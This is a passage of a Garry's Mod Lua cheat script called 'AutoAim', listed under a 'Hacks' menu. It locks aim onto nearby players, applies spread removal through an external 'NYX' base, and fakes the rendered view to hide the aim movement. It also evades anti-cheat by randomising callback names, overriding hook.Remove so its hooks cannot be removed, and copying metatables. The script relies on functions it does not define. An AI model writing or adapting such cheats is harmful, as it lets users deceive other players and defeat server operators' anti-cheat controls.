    local function AddCVarHook(self, convar, funcName, ...)
        local hookName = "CVar_" .. convar
        if !cvarhooks[convar] then
            local random = RandomName()
            
            local callbacks = GetCallbackTable(convar)
            callbacks[random] = function(...)
                CallHook(self, hookName, {...})
            end
            
            cvarhooks[convar] = random
        end
        AddHook(self, hookName, funcName)
    end
    
    -- Don't let other scripts remove our hooks.
    local oldRemove = hook.Remove
    function hook.Remove(name, unique)
        if created[name] == unique then return end
        oldRemove(name, unique)
    end
    
    -- Removes all hooks, useful if reloading the script.
    local function RemoveHooks()
        for hookName, unique in pairs(created) do
            oldRemove(hookName, unique)
        end
        for convar, unique in pairs(cvarhooks) do
            local callbacks = GetCallbackTable(convar)
            callbacks[unique] = nil
        end
    end
    
    -- Add copies the script can access.
    zz.AddHook = AddHook
    zz.AddCVarHook = AddCVarHook
    zz.CallHook = CallHook
    zz.RemoveHooks = RemoveHooks
end

concommand.Add("zz_reload", function()
    zz:CallHook("Shutdown")
    print("Removing hooks...")
    zz:RemoveHooks()
    
    zz = nil
    local info = debug.getinfo(1, "S")
    if info && info.short_src then
        if string.Left(info.short_src, 3) == "lua" then
            info.short_src = string.sub(info.short_src, 5)
        end
        print("Reloading (" .. info.short_src .. ")...")
        include(info.short_src)
    else
        print("Cannot find AutoAim file, reload manually.")
    end
end)
print("AutoAim loaded.")

-- ##################################################
-- MetaTables
-- ##################################################

local function GetMeta(name)
    return table.Copy(FindMetaTable(name) or {})
end

local AngM = GetMeta("Angle")
local CmdM = GetMeta("CUserCmd")
local EntM = GetMeta("Entity")
local PlyM = GetMeta("Player")
local VecM = GetMeta("Vector")

-- ##################################################
-- Settings
-- ##################################################

do
    local settings = {}
    local function SettingVar(self, name)
        return (self.SettingPrefix or "") .. string.lower(name)
    end
    
    local function RandomName()
        local random = ""
        for i = 1, math.random(4, 10) do
            local c = math.random(65, 116)
            if c >= 91 && c <= 96 then c = c + 6 end
            random = random .. string.char(c)
        end
        return random
    end
    
    local function SetSetting(name, _, new)
        if !settings[name] then return end
        local info = settings[name]
        
        if info.Type == "number" then
            new = tonumber(new)
        elseif info.Type == "boolean" then
            new = (tonumber(new) or 0) > 0
        end
        
        info.Value = new
    end
    
    local function CreateSetting(self, name, desc, default, misc)
        local cvar = SettingVar(self, name)
        local info = {Name = name, Desc = desc, CVar = cvar, Type = type(default), Value = default}
        
        for k, v in pairs(misc or {}) do
            if !info[k] then info[k] = v end
        end
        
        -- Convert default from boolean to number.
        if type(default) == "boolean" then
            default = default and 1 or 0
        end
        
        if !settings[cvar] then
            local tab = cvars.GetConVarCallbacks(cvar)
            if !tab then
                cvars.AddChangeCallback(cvar, function() end)
                tab = cvars.GetConVarCallbacks(cvar)
            end
            
            while true do
                local name = RandomName()
                if !tab[name] then
                    tab[name] = SetSetting
                    info.Callback = name
                    break
                end
            end
        end
        
        settings[cvar] = info
        settings[#settings + 1] = info
        
        -- Create the convar.
        CreateClientConVar(cvar, default, (info.Save != false), false)
        SetSetting(cvar, _, GetConVarString(cvar))
    end
    local function GetSetting(self, name)
        local cvar = SettingVar(self, name)
        if !settings[cvar] then return end
        return settings[cvar].Value
    end
    local function Shutdown()
        print("Removing settings callbacks...")
        for _, info in ipairs(settings) do
            if info.CVar && info.Callback then
                local tab = cvars.GetConVarCallbacks(info.CVar)
                if tab then
                    tab[info.Callback] = nil
                end
            end
        end
    end
    local function SettingsList()
        return table.Copy(settings)
    end
    local function BuildMenu(self, panel)
        for _, info in ipairs(settings) do
            if info.Show != false then
                if info.MultiChoice then
                    local m = panel:MultiChoice(info.Desc or info.CVar, info.CVar)
                    for k, v in pairs(info.MultiChoice) do
                        m:AddChoice(k, v)
                    end
                elseif info.Type == "number" then
                    panel:NumSlider(info.Desc or info.CVar, info.CVar, info.Min or -1, info.Max or -1, info.Places or 0)
                elseif info.Type == "boolean" then
                    panel:CheckBox(info.Desc or info.CVar, info.CVar)
                elseif info.Type == "string" then
                    panel:TextEntry(info.Desc or info.CVar, info.CVar)
                end
            end
        end
    end
    
    zz.SettingPrefix = "zz_"
    zz.CreateSetting = CreateSetting
    zz.Setting = GetSetting
    zz.SettingsList = SettingsList
    zz.BuildMenu = BuildMenu
    
    zz.SettingsShutdown = Shutdown
    zz:AddHook("Shutdown", "SettingsShutdown")
end


-- ##################################################
-- Targetting - Positions
-- ##################################################

zz.ModelTarget = {}
function zz:SetModelTarget(model, targ)
    self.ModelTarget[model] = targ
end
function zz:BaseTargetPosition(ent)
    -- The eye attachment is a lot more stable than bones for players.
    if type(ent) == "Player" then
        local head = EntM["LookupAttachment"](ent, "eyes")
        if head then
            local pos = EntM["GetAttachment"](ent, head)
            if pos then
                return pos.Pos - (AngM["Forward"](pos.Ang) * 2)
            end
        end
    end
    
    -- Check if the model has a special target assigned to it.
    local special = self.ModelTarget[string.lower(EntM["GetModel"](ent) or "")]
    if special then
        -- It's a string - look for a bone.
        if type(special) == "string" then
            local bone = EntM["LookupBone"](ent, special)
            if bone then
                local pos = EntM["GetBonePosition"](ent, bone)
                if pos then
                    return pos
                end
            end
        -- It's a Vector - return a relative position.
        elseif type(special) == "Vector" then
            return EntM["LocalToWorld"](ent, special)
        -- It's a function - do something fancy!
        elseif type(special) == "function" then
            local pos = pcall(special, ent)
            if pos then return pos end
        end
    end

    -- Try and use the head bone, found on all of the player + human models.
    local bone = "ValveBiped.Bip01_Head1"
    local head = EntM["LookupBone"](ent, bone)
    if head then
        local pos = EntM["GetBonePosition"](ent, head)
        if pos then
            return pos
        end
    end

    -- Give up and return the center of the entity.
    return EntM["LocalToWorld"](ent, EntM["OBBCenter"](ent))
end
function zz:TargetPosition(ent)
    local targetPos = self:BaseTargetPosition(ent)
    
    local ply = LocalPlayer()
    if ValidEntity(ply) then
        targetPos = self:CallHook("TargetPrediction", {ply, ent, targetPos}) or targetPos
    end
    
    return targetPos
end

zz:SetModelTarget("models/crow.mdl", Vector(0, 0, 5))                        -- Crow.
zz:SetModelTarget("models/pigeon.mdl", Vector(0, 0, 5))                     -- Pigeon.
zz:SetModelTarget("models/seagull.mdl", Vector(0, 0, 6))                     -- Seagull.
zz:SetModelTarget("models/combine_scanner.mdl", "Scanner.Body")                 -- Scanner.
zz:SetModelTarget("models/hunter.mdl", "MiniStrider.body_joint")             -- Hunter.
zz:SetModelTarget("models/combine_turrets/floor_turret.mdl", "Barrel")         -- Turret.
zz:SetModelTarget("models/dog.mdl", "Dog_Model.Eye")                         -- Dog.
zz:SetModelTarget("models/vortigaunt.mdl", "ValveBiped.Head")                 -- Vortigaunt.
zz:SetModelTarget("models/antlion.mdl", "Antlion.Body_Bone")                     -- Antlion.
zz:SetModelTarget("models/antlion_guard.mdl", "Antlion_Guard.Body")             -- Antlion guard.
zz:SetModelTarget("models/antlion_worker.mdl", "Antlion.Head_Bone")             -- Antlion worker.
zz:SetModelTarget("models/zombie/fast_torso.mdl", "ValveBiped.HC_BodyCube")     -- Fast zombie torso.
zz:SetModelTarget("models/zombie/fast.mdl", "ValveBiped.HC_BodyCube")         -- Fast zombie.
zz:SetModelTarget("models/headcrabclassic.mdl", "HeadcrabClassic.SpineControl") -- Normal headcrab.
zz:SetModelTarget("models/headcrabblack.mdl", "HCBlack.body")                 -- Poison headcrab.
zz:SetModelTarget("models/headcrab.mdl", "HCFast.body")                         -- Fast headcrab.
zz:SetModelTarget("models/zombie/poison.mdl", "ValveBiped.Headcrab_Cube1")     -- Poison zombie.
zz:SetModelTarget("models/zombie/classic.mdl", "ValveBiped.HC_Body_Bone")     -- Zombie.
zz:SetModelTarget("models/zombie/classic_torso.mdl", "ValveBiped.HC_Body_Bone") -- Zombie torso.
zz:SetModelTarget("models/zombie/zombie_soldier.mdl", "ValveBiped.HC_Body_Bone") -- Zombine.
zz:SetModelTarget("models/combine_strider.mdl", "Combine_Strider.Body_Bone") -- Strider.
zz:SetModelTarget("models/combine_dropship.mdl", "D_ship.Spine1")             -- Combine dropship.
zz:SetModelTarget("models/combine_helicopter.mdl", "Chopper.Body")             -- Combine helicopter.
zz:SetModelTarget("models/gunship.mdl", "Gunship.Body")                        -- Combine gunship.
zz:SetModelTarget("models/lamarr.mdl", "HeadcrabClassic.SpineControl")        -- Lamarr!
zz:SetModelTarget("models/mortarsynth.mdl", "Root Bone")                        -- Mortar synth.
zz:SetModelTarget("models/synth.mdl", "Bip02 Spine1")                        -- Synth.
zz:SetModelTarget("models/vortigaunt_slave.mdl", "ValveBiped.Head")            -- Vortigaunt slave.


-- ##################################################
-- Targetting - General
-- ##################################################

zz.NPCDeathSequences = {}
function zz:AddNPCDeathSequence(model, sequence)
    self.NPCDeathSequences = self.NPCDeathSequences or {}
    self.NPCDeathSequences[model] = self.NPCDeathSequences[model] or {}
    if !table.HasValue(self.NPCDeathSequences[model]) then
        table.insert(self.NPCDeathSequences[model], sequence)
    end
end

zz:AddNPCDeathSequence("models/barnacle.mdl", 4)
zz:AddNPCDeathSequence("models/barnacle.mdl", 15)
zz:AddNPCDeathSequence("models/antlion_guard.mdl", 44)
zz:AddNPCDeathSequence("models/hunter.mdl", 124)
zz:AddNPCDeathSequence("models/hunter.mdl", 125)
zz:AddNPCDeathSequence("models/hunter.mdl", 126)
zz:AddNPCDeathSequence("models/hunter.mdl", 127)
zz:AddNPCDeathSequence("models/hunter.mdl", 128)

zz:CreateSetting("predictblocked", "Predict blocked (time)", 0.4, {Min = 0, Max = 1})
function zz:BaseBlocked(target, offset)
    local ply = LocalPlayer()
    if !ValidEntity(ply) then return end
    
    -- Trace from the players shootpos to the position.
    local shootPos = PlyM["GetShootPos"](ply)
    local targetPos = self:TargetPosition(target)
    
    if offset then targetPos = targetPos + offset end

    local trace = util.TraceLine({start = shootPos, endpos = targetPos, filter = {ply, target}, mask = MASK_SHOT})
    local wrongAim = self:AngleBetween(PlyM["GetAimVector"](ply), VecM["GetNormal"](targetPos - shootPos)) > 2

    -- If we hit something, we're "blocked".
    if trace.Hit && trace.Entity != target then
        return true, wrongAim
    end

    -- It is not blocked.
    return false, wrongAim
end
function zz:TargetBlocked(target)
    if !target then target = NYX:GetATarget() end
    if !target then return end
    
    local blocked, wrongAim = self:BaseBlocked(target)
    if self:Setting("predictblocked") > 0 && blocked then
        blocked = self:BaseBlocked(target, EntM["GetVelocity"](target) * self:Setting("predictblocked"))
    end
    return blocked, wrongAim
end
    

function zz:SetTarget(ent)
    if self.Target && !ent then
        self:CallHook("TargetLost")
    elseif !self.Target && ent then
        self:CallHook("TargetGained")
    elseif self.Target && ent && self.Target != ent then
        self:CallHook("TargetChanged")
    end

    self.Target = ent
end

zz:CreateSetting("maxangle", "Max angle", 30, {Min = 5, Max = 90})
zz:CreateSetting("targetblocked", "Don't check LOS", false)
zz:CreateSetting("holdtarget", "Hold targets", false)
function zz:FindTarget()
    if !self:Enabled() then return end

    local ply = LocalPlayer()
    if !ValidEntity(ply) then return end

    local maxAng = self:Setting("maxangle")
    local aimVec, shootPos = PlyM["GetAimVector"](ply), PlyM["GetShootPos"](ply)
    local targetBlocked = self:Setting("targetblocked")

    if self:Setting("holdtarget") then
        local target = NYX:GetATarget()
        if target then
            local targetPos = self:TargetPosition(target)
            local angle = self:AngleBetween(AngM["Forward"](self:GetView()), VecM["GetNormal"](targetPos - shootPos))
            local blocked = self:TargetBlocked(target)
            if angle <= maxAng && (!blocked || targetBlocked) then return end
        end
    end

    -- Filter out targets.
    local targets = player.GetAll()
    for i, ent in pairs(targets) do
        if NYX:ValidTarget(ent) == false then
            targets[i] = nil
        end
    end

    local closestTarget, lowestAngle = _, maxAng
    for _, target in pairs(targets) do
        if targetBlocked || !self:TargetBlocked(target) then
            local targetPos = self:TargetPosition(target)
            local angle = self:AngleBetween(AngM["Forward"](self:GetView()), VecM["GetNormal"](targetPos - shootPos))

            if angle < lowestAngle then
                lowestAngle = angle
                closestTarget = target
            end
        end
    end

    self:SetTarget(closestTarget)
end
zz:AddHook("Think", "FindTarget")


-- ##################################################
-- Fake view
-- ##################################################

zz.View = Angle(0, 0, 0)
function zz:GetView()
    return self.View * 1
end
function zz:KeepView()
    if !self:Enabled() then return end

    local ply = LocalPlayer()
    if !ValidEntity(ply) then return end

    self.View = EntM["EyeAngles"](ply)
end
zz:AddHook("OnToggled", "KeepView")

local sensitivity = 0.022
function zz:RotateView(cmd)
    self.View.p = math.Clamp(self.View.p + (CmdM["GetMouseY"](cmd) * sensitivity), -89, 89)
    self.View.y = math.NormalizeAngle(self.View.y + (CmdM["GetMouseX"](cmd) * sensitivity * -1))
end

zz:CreateSetting("debug", "Debug", false, {Show = false})
function zz:FakeView(ply, origin, angles, FOV)
    if !self:Enabled() && !self.SetAngleTo then return end
    if GetViewEntity() != LocalPlayer() then return end
    if self:Setting("debug") then return end
    
    local base = GAMEMODE:CalcView(ply, origin, self.SetAngleTo or self.View, FOV) or {}
            base.angles = base.angles or (self.AngleTo or self.View)
            base.angles.r = 0 -- No crappy screen tilting in ZS.
    return base
end
zz:AddHook("CalcView", "FakeView")


function zz:TargetPrediction(ply, target, targetPos)
    local weap = PlyM["GetActiveWeapon"](ply)
    if ValidEntity(weap) then
        local class = EntM["GetClass"](weap)
        if class == "weapon_crossbow" then
            local dist = VecM["Length"](targetPos - PlyM["GetShootPos"](ply))
            local time = (dist / 3500) + 0.05 -- About crossbow bolt speed.
            targetPos = targetPos + (EntM["GetVelocity"](target) * time)
        end
        
        local mul = 0.0075
        --targetPos = targetPos - (e["GetVelocity"](ply) * mul)
    end
    
    return targetPos
end
zz:AddHook("TargetPrediction", "TargetPrediction")

-- ##################################################
-- Aim http://steamcommunity.com/id/Blacklemore/ Zombezz
-- ##################################################

function zz:SetAngle(ang)
    self.SetAngleTo = ang
end

zz:CreateSetting("smoothspeed", "Smooth aim speed (0 to disable)", 120, {Min = 0, Max = 360})
zz:CreateSetting("snaponfire", "Snap on fire", true)
zz:CreateSetting("snapgrace", "Snap on fire grace", 0.5, {Min = 0, Max = 3, Places = 1})
zz.LastAttack = 0
function zz:SetAimAngles(cmd)
    self:RotateView(cmd)

    if !self:Enabled() && !self.SetAngleTo then return end

    local ply = LocalPlayer()
    if !ValidEntity(ply) then return end

    -- We're aiming with the view, normally.
    local targetAim = self:GetView()

    -- If we have a target, aim at them! SPREAD
    local target = NYX:GetATarget()

    if target then
        local targetPos = NYX:GetAimPos(target)
        targetAim = NYX:NoSpread(cmd,VecM["Angle"](targetPos - ply:GetShootPos()))
    end

    -- We're following the view, until we fire.
    if self:Setting("snaponfire") then
        local time = CurTime()
        if PlyM["KeyDown"](ply, IN_ATTACK) || PlyM["KeyDown"](ply, IN_ATTACK2) || self:Setting("autoshoot") != 0 then
            self.LastAttack = time
        end
        if CurTime() - self.LastAttack > self:Setting("snapgrace") then
            targetAim = self:GetView()
        end
    end

    -- We want to change to whatever was SetAngle'd.
    if self.SetAngleTo then
        targetAim = self.SetAngleTo
    end

    -- Smooth aiming.
    local smooth = self:Setting("smoothspeed")
    if smooth > 0 then
        local current = CmdM["GetViewAngles"](cmd)

        -- Approach the target angle.
        current = self:ApproachAngle(current, targetAim, smooth * FrameTime())
        current.r = 0

        -- If we're just following the view, we don't need to smooth it.
        if self.RevertingAim then
            local diff = self:NormalizeAngle(current - self:GetView())
            if math.abs(diff.p) < 1 && math.abs(diff.y) < 1 then self.RevertingAim = false end
        elseif targetAim == self:GetView() then
            current = targetAim
        end

        -- Check if the angles are the same...
        if self.SetAngleTo then
            local diff = self:NormalizeAngle(current - self.SetAngleTo)
            if math.abs(diff.p) < 1 && math.abs(diff.y) < 1 then self.SetAngleTo = nil end
        end

        aim = current
    else
        aim = targetAim
        self.SetAngleTo = nil
    end

    -- Set the angles.
    CmdM["SetViewAngles"](cmd, aim)
    local sensitivity = 0.22
    local diff = aim - CmdM["GetViewAngles"](cmd)
    CmdM["SetMouseX"](cmd, diff.y / sensitivity)
    CmdM["SetMouseY"](cmd, diff.p / sensitivity)
    

    -- Change the players movement to be relative to their view instead of their aim.
    local move = Vector(CmdM["GetForwardMove"](cmd), CmdM["GetSideMove"](cmd), 0)
    local norm = VecM["GetNormal"](move)
    local set = AngM["Forward"](VecM["Angle"](norm) + (aim - self:GetView())) * VecM["Length"](move)
        CmdM["SetForwardMove"](cmd, set.x)
        CmdM["SetSideMove"](cmd, set.y)
end
zz:AddHook("CreateMove", "SetAimAngles")

function zz:RevertAim()
    self.RevertingAim = true
end
zz:AddHook("TargetLost", "RevertAim")
function zz:StopRevertAim()
    self.RevertingAim = false
end
zz:AddHook("TargetGained", "RevertAim")

-- When we turn off the bot, we want our aim to go back to our view.
function zz:ViewToAim()
    if self:Enabled() then return end
    self:SetAngle(self:GetView())
end
zz:AddHook("OnToggled", "ViewToAim")


-- ##################################################
-- HUD
-- ##################################################

zz:CreateSetting("crosshair", "Crosshair size (0 to disable)", 18, {Min = 0, Max = 20})
function zz:DrawTarget()
    if !self:Enabled() then return end

    local target = NYX:GetATarget()
    if !target then return end

    local size = self:Setting("crosshair")
    if size <= 0 then return end

    -- Change colour on the block status.
    local blocked, aimOff = self:TargetBlocked()
    if blocked then
        surface.SetDrawColor(255, 0, 0, 255) -- Red.
    elseif aimOff then
        surface.SetDrawColor(255, 255, 0, 255) -- Yellow.
    else
        surface.SetDrawColor(0, 255, 0, 255) -- Green.
    end

    -- Get the onscreen coordinates for the target.
    local pos = self:TargetPosition(target)

    local screen = VecM["ToScreen"](pos)
    local x, y = screen.x, screen.y

    -- Work out sizes.
    local a, b = size / 2, size / 6

    -- Top left.
    surface.DrawLine(x - a, y - a, x - b, y - a)
    surface.DrawLine(x - a, y - a, x - a, y - b)

    -- Bottom right.
    surface.DrawLine(x + a, y + a, x + b, y + a)
    surface.DrawLine(x + a, y + a, x + a, y + b)

    -- Top right.
    surface.DrawLine(x + a, y - a, x + b, y - a)
    surface.DrawLine(x + a, y - a, x + a, y - b)

    -- Bottom left.
    surface.DrawLine(x - a, y + a, x - b, y + a)
    surface.DrawLine(x - a, y + a, x - a, y + b)
end
zz:AddHook("HUDPaint", "DrawTarget")


zz.ScreenMaxAngle = {
    Length = 0,
    FOV = 0,
    MaxAngle = 0
}
zz:CreateSetting("draw_maxangle", "Draw Max Angle", true)
function zz:DrawMaxAngle()
    if !self:Enabled() then return end

    -- Check that we want to be drawing this...
    local show = zz:Setting("draw_maxangle")
    if !show then return end

    -- We need a player for this to work...
    local ply = LocalPlayer()
    if !ValidEntity(ply) then return end

    local info = self.ScreenMaxAngle
    local maxang = zz:Setting("maxangle")
    
    local fov = PlyM["GetFOV"](ply)
    if GetViewEntity() == ply && (maxang != info.MaxAngle || fov != info.FOV) then
        local view = self:GetView()
            view.p = view.p + maxang

        local screen = (PlyM["GetShootPos"](ply) + (AngM["Forward"](view) * 100))
        screen = VecM["ToScreen"](screen)

        info.Length = math.abs((ScrH() / 2) - screen.y)

        info.MaxAngle = maxang
        info.FOV = fov
    end

    local length = info.Length

    local cx, cy = ScrW() / 2, ScrH() / 2
    for x = -1, 1 do
        for y = -1, 1 do
            if x != 0 || y != 0 then
                local add = VecM["GetNormal"](Vector(x, y, 0)) * length
                surface.SetDrawColor(0, 0, 0, 255)
                surface.DrawRect((cx + add.x) - 2, (cy + add.y) - 2, 5, 5)
                surface.SetDrawColor(255, 255, 255, 255)
                surface.DrawRect((cx + add.x) - 1, (cy + add.y) - 1, 3, 3)
            end
        end
    end

end
zz:AddHook("HUDPaint", "DrawMaxAngle")

-- ##################################################
-- Toggle
-- ##################################################

zz.IsEnabled = false
function zz:Enabled() return AIM_gSilent end

-- ##################################################
-- Menu
-- ##################################################

function zz:OpenMenu()
    local w, h = ScrW() / 3, ScrH() / 2

    local menu = vgui.Create("DFrame")
    menu:SetTitle("AutoAim")
    menu:SetSize(w, h)
    menu:Center()
    menu:MakePopup()

    local scroll = vgui.Create("DPanelList", menu)
    scroll:SetPos(5, 25)
    scroll:SetSize(w - 10, h - 30)
    scroll:EnableVerticalScrollbar()

    local form = vgui.Create("DForm", menu)
    form:SetName("")
    form.Paint = function() end
    scroll:AddItem(form)

    self:BuildMenu(form)

    if zz.Menu then zz.Menu:Remove() end
    zz.Menu = menu
end
concommand.Add("zz_menu", function() zz:OpenMenu() end)

function zz:RegisterMenu()
    spawnmenu.AddToolMenuOption("Options", "Hacks", "AutoAim", "AutoAim", "", "", function(p) self:BuildMenu(p) end)
end
zz:AddHook("PopulateToolMenu", "RegisterMenu")

-- ##################################################
-- Useful functions
-- ##################################################

function zz:AngleBetween(a, b)
    return math.deg(math.acos(VecM["Dot"](a, b)))
end

function zz:NormalizeAngle(ang)
    return Angle(math.NormalizeAngle(ang.p), math.NormalizeAngle(ang.y), math.NormalizeAngle(ang.r))
end

function zz:ApproachAngle(start, target, add)
    local diff = self:NormalizeAngle(target - start)

    local vec = Vector(diff.p, diff.y, diff.r)
    local len = VecM["Length"](vec)
    vec = VecM["GetNormal"](vec) * math.min(add, len)

    return start + Angle(vec.x, vec.y, vec.z)
end

local notAuto = {"weapon_pistol", "weapon_rpg", "weapon_357", "weapon_crossbow"}
function zz:IsSemiAuto(weap)
    if !ValidEntity(weap) then return end
    return (weap.Primary && !weap.Primary.Automatic) || table.HasValue(notAuto, EntM["GetClass"](weap))
end